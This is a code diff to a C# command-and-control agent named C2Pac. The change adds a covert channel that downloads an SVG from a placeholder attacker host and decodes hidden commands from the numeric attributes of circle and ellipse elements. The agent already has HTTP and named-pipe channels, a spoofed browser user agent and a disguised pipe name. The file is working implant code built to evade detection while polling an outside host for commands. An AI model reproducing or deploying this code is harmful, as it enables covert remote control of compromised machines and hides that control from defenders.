@@ -6,6 +6,7 @@ using System.Text.Json;
 using System.Threading.Tasks;
 using System.Net;
 using System.IO.Pipes;
+using System.Xml;
 
 public class C2Command
 {
@@ -19,8 +20,8 @@ public class C2Pac
 {
     //  HTTP C2 variables
     private static readonly HttpClient client = new HttpClient();
-    static string url = "http://<updateme>.com/something/page.html";
-    
+    static string url = "http://<updateme>.com/something/dontbesuspicious.svg";
+
     static string customUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
     static string? customHeaderProperty = null;
     static string? customHeaderValue = null;
@@ -29,6 +30,9 @@ public class C2Pac
     static string c2PipeServer = ".";
     static string c2PipeName = "Winsock2\\CatalogChangeListener-182a";
 
+    //  SVG C2 variables
+    public static string nodeXPath = "//svg:circle|//svg:ellipse";
+
     //  Agent configuration variables
     static char commandDelimiter = ':';
     static int retrieveInterval = 30000;
@@ -36,9 +40,9 @@ public class C2Pac
     public static async Task Main(string[] args)
     {
         Console.WriteLine("[*] Starting C2 agent");
-
+        
         Console.WriteLine("[*] Querying C2 endpoint...");
-
+        
         while (true)
         {
             string c2Command = await RetrieveCommand();
@@ -75,7 +79,11 @@ public class C2Pac
         //string command = await RetrieveCommandFromHTTPGet();
 
         //  Named Pipe example
-        string command = RetrieveFromNamedPipe(c2PipeServer,c2PipeName);
+        //string command = RetrieveFromNamedPipe(c2PipeServer, c2PipeName);
+
+        // SVG example
+        string c2svg = await RetrieveCommandFromHTTPGet(url);
+        string command = RetrieveFromSVG(c2svg);
 
         //  return the command for parsing and execution
         return command;
@@ -258,7 +266,7 @@ public class C2Pac
     }
 
     // HTTP GET PoC
-    public static async Task<string> RetrieveCommandFromHTTPGet()
+    public static async Task<string> RetrieveCommandFromHTTPGet(string url)
     {
         try
         {
@@ -348,4 +356,83 @@ public class C2Pac
             }
         }
     }
+
+    public static string RetrieveFromSVG(string svgString)
+    {
+        XmlDocument doc = new XmlDocument();
+        try
+        {
+            doc.LoadXml(svgString);
+
+            // configure namespace
+            XmlNamespaceManager nsmgr = new XmlNamespaceManager(doc.NameTable);
+            nsmgr.AddNamespace("svg", "http://www.w3.org/2000/svg");
+
+            // select control nodes
+            XmlNodeList codedNodes = doc.SelectNodes(nodeXPath, nsmgr);
+
+            if (codedNodes != null && codedNodes.Count > 0)
+            {
+                //Console.WriteLine($"Found {codedNodes.Count} coded element(s) in the SVG:");
+
+                string myString = "";
+                System.Text.StringBuilder sb = new System.Text.StringBuilder(myString);
+
+                foreach (XmlNode codeNode in codedNodes)
+                {
+                    if (codeNode != null)
+                    {
+                        // cast to XmlElement for easier access to attributes
+                        XmlElement codeElement = codeNode as XmlElement;
+                        if (codeElement != null)
+                        {
+                            if (codeElement.HasAttribute("cx"))
+                            {
+                                int characterCode1 = int.Parse(codeElement.GetAttribute("cx"));
+                                char character1 = (char)characterCode1;
+                                //Console.WriteLine($"  cx: {codeElement.GetAttribute("cx")}");
+                                Console.Write(character1);
+                                sb.Append(character1);
+                            }
+
+                            if (codeElement.HasAttribute("cy"))
+                            {
+                                int characterCode2 = int.Parse(codeElement.GetAttribute("cy"));
+                                char character2 = (char)characterCode2;                                
+                                //Console.WriteLine($"  cy: {codeElement.GetAttribute("cy")}");
+                                //Console.Write(character2);
+                                sb.Append(character2);
+                            }
+
+                            if (codeElement.HasAttribute("r"))
+                            {
+                                int characterCode3 = int.Parse(codeElement.GetAttribute("r"));
+                                char character3 = (char)characterCode3;
+                                //Console.WriteLine($"  r:  {codeElement.GetAttribute("r")}");
+                                //Console.Write(character3);
+                                sb.Append(character3);
+                            }
+                        }
+                    }
+                }
+                //Console.WriteLine(sb.ToString());   
+                return sb.ToString();
+            }
+            else
+            {
+                Console.WriteLine("No coded elements found in the SVG (check XPath or namespaces).");
+                return null;
+            }
+        }
+        catch (XmlException ex)
+        {
+            Console.WriteLine($"Error loading XML: {ex.Message}");
+            return null;
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"An unexpected error occurred: {ex.Message}");
+            return null;
+        }
+    }    
 }
